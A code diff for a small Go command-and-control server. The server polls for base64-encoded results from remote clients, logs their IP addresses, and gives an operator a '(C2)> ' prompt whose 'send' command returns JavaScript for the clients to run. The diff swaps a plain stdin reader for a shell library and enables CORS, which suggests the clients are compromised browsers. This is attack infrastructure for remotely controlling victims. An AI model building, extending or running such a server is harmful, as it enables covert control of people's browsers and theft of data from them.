@@ -1,9 +1,9 @@
 package main
 
 import (
-	"bufio"
 	"encoding/base64"
 	"fmt"
+	"github.com/theskibb/sShell/sShell"
 	"log"
 	"net/http"
 	"os"
@@ -17,9 +17,6 @@ func cmdHandler(w http.ResponseWriter, r *http.Request) {
 	if ip == "" {
 		ip = r.RemoteAddr
 	}
-
-	fmt.Println("recieved req from: ", ip)
-
 	//print feedback
 	feedbackBase64 := r.URL.Query().Get("res")
 	feedback, err := base64.StdEncoding.DecodeString(feedbackBase64)
@@ -29,13 +26,26 @@ func cmdHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	fmt.Println("feedback varible is set to:", string(feedback))
+	fmt.Println("recieved req from: ", ip)
 
-	//get next command
-	fmt.Print("(c2)>")
-	reader := bufio.NewReader(os.Stdin)
-	input, err := reader.ReadString('\n')
+	ss := sshell.ShellSettings{
+		Promt:   "(C2)> ",
+		ExitMsg: "exit",
+		Commands: []sshell.Command{
+			sshell.Command{
+				Input:   "send",
+				Handler: sendHandler,
+				HelpMsg: "send <output javascript to send>",
+			},
+		},
+		DefaultHandler: func(args []string) string { fmt.Println("could not recognize input"); return "" },
+		SingleMode:     true,
+	}
+
+	input, err := sshell.StartShell(ss)
+
 	if err != nil {
-		log.Fatal("could not read from stdin", err)
+		log.Fatal("something went wrong with the shell", err)
 	}
 
 	enableCors(&w)
@@ -43,6 +53,16 @@ func cmdHandler(w http.ResponseWriter, r *http.Request) {
 	time.Sleep(1 / 2 * time.Second)
 
 	fmt.Fprint(w, input)
+}
+
+func sendHandler(args []string) string {
+	output := ""
+
+	for _, arg := range args {
+		output += arg + " "
+	}
+
+	return output
 }
 
 func enableCors(w *http.ResponseWriter) {
